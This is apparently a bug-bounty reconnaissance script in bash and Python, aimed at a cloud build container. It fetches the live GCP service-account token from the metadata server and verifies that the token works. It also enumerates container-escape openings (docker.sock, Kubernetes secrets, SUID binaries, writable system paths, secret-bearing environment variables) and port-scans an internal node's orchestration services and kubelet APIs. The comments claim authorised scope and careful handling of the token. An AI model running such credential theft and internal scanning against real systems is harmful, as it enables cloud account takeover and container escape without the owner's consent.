#!/usr/bin/env bash
# H1 build-container recon v7 — the untested invited targets: GCP metadata (orchestration/SA token),
# container-escape primitives (caps/docker.sock/k8s-sa/suid/mounts), and node internal port-scan.
# RoE explicitly INVITES: root priv-esc, secrets NOT accessible to my user, container escape, orchestration plane.
# STRICT HYGIENE: read-only, minimum-proof. A live GCP/K8s token is NEVER written to the public output —
# only its length + sha256[:16] + token_type + expires_in + SCOPES (scopes prove impact w/o exposing the cred).
# Researcher: abedalaziz123sayed. Low-and-slow. No cross-tenant data consumed.
set +e
PUB="public/recon7.txt"; mkdir -p public; : > "$PUB"
p(){ echo "$*" >> "$PUB"; }
p "=====RECON7 START====="
p "id=$(id)  node=$HOST_NODE_IP  ip=$(hostname -I 2>/dev/null)"

# ---------- 1) GCP metadata server (THE orchestration/secret escalation) ----------
p ""
p "## GCP metadata reachability (metadata.google.internal / 169.254.169.254):"
for HOST in metadata.google.internal 169.254.169.254; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -m4 -H "Metadata-Flavor: Google" "http://$HOST/computeMetadata/v1/" 2>/dev/null)
  p "  $HOST/computeMetadata/v1/ -> HTTP $code"
done
p "  project-id: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null | head -c120)"
p "  numeric-project-id: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id 2>/dev/null | head -c60)"
p "  instance/zone: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/zone 2>/dev/null | head -c120)"
p "  instance/name: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/name 2>/dev/null | head -c80)"
p "  SA list: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>/dev/null | tr '\n' ',' | head -c200)"
p "  default SA email: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email 2>/dev/null | head -c120)"
p "  default SA scopes: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes 2>/dev/null | tr '\n' ',' | head -c400)"
# token: PROVE acquisition WITHOUT exposing the live credential
python3 - <<'PY' >> "$PUB"
import urllib.request, json, hashlib
try:
    req=urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                               headers={"Metadata-Flavor":"Google"})
    r=urllib.request.urlopen(req, timeout=4); d=json.load(r)
    tok=d.get("access_token","")
    print("  SA TOKEN OBTAINED: len=%d sha256[:16]=%s type=%s expires_in=%s" % (
        len(tok), hashlib.sha256(tok.encode()).hexdigest()[:16], d.get("token_type"), d.get("expires_in")))
    # prove the token is USABLE (impact) by calling tokeninfo — returns scopes+email, NOT secret data
    import urllib.parse
    ti=urllib.request.urlopen("https://www.googleapis.com/oauth2/v1/tokeninfo?access_token="+urllib.parse.quote(tok), timeout=5)
    tj=json.load(ti)
    print("  TOKENINFO: scope=%s email=%s aud=%s expires_in=%s" % (tj.get("scope"), tj.get("email"), tj.get("audience"), tj.get("expires_in")))
except Exception as e:
    print("  SA TOKEN: FAIL %r" % (str(e)[:160],))
PY

# ---------- 2) container-escape primitives ----------
p ""
p "## container-escape primitives:"
p "  caps(self): $(grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status 2>/dev/null | tr '\n' ' ')"
p "  /proc/1/cgroup: $(cat /proc/1/cgroup 2>/dev/null | tr '\n' '|' | head -c240)"
p "  docker.sock: $(ls -la /var/run/docker.sock 2>&1 | head -c120)"
p "  containerd.sock: $(ls -la /run/containerd/containerd.sock 2>&1 | head -c120)"
p "  k8s SA token dir: $(ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | tr '\n' ',' | head -c240)"
p "  /run/secrets: $(ls -la /run/secrets/ 2>&1 | tr '\n' ',' | head -c200)"
p "  suid binaries: $(find / -perm -4000 -type f 2>/dev/null | head -20 | tr '\n' ',')"
p "  sudo -n: $(sudo -n true 2>&1 | head -c80; echo " rc=$?")"
p "  writable root paths(sample): $(find /etc /usr/local/bin -writable -type f 2>/dev/null | head -8 | tr '\n' ',')"
p "  mounts(sensitive): $(mount 2>/dev/null | grep -iE 'secret|docker|/proc/|/sys/fs' | head -8 | tr '\n' '|' | head -c300)"
p "  env(NON-secret keys only): $(env 2>/dev/null | cut -d= -f1 | grep -iE 'NETLIFY|AWS|GCP|GOOGLE|K8S|KUBE|TOKEN|SECRET|VAULT|CONSUL|NOMAD' | tr '\n' ',' | head -c300)"

# ---------- 3) node internal port-scan (172.16.7.1) — orchestration services ----------
p ""
p "## node 172.16.7.1 internal port-scan (orchestration surface):"
python3 - <<'PY' >> "$PUB"
import socket
node="172.16.7.1"
ports={22:"ssh",80:"http",443:"https",2375:"docker",2376:"docker-tls",6443:"k8s-api",8443:"k8s-alt",
10250:"kubelet",10255:"kubelet-ro",2379:"etcd",8500:"consul",4646:"nomad",8200:"vault",
9092:"kafka",4317:"otlp",8080:"http-alt",9090:"prom",50051:"grpc",3000:"grafana",6379:"redis"}
for pt,nm in sorted(ports.items()):
    s=socket.socket(); s.settimeout(2)
    try:
        s.connect((node,pt)); print(f"  {node}:{pt} ({nm}) OPEN"); s.close()
    except Exception:
        pass
print("  (only OPEN ports listed)")
PY

# ---------- 4) kubelet read-only API if reachable (10255) — pod list = cross-tenant ----------
p ""
p "## kubelet/k8s api quick probe:"
p "  10255/pods: $(curl -s -o /dev/null -w '%{http_code}' -m3 http://172.16.7.1:10255/pods 2>/dev/null)"
p "  10250/pods(https): $(curl -sk -o /dev/null -w '%{http_code}' -m3 https://172.16.7.1:10250/pods 2>/dev/null)"

p "=====RECON7 END====="
cat "$PUB"
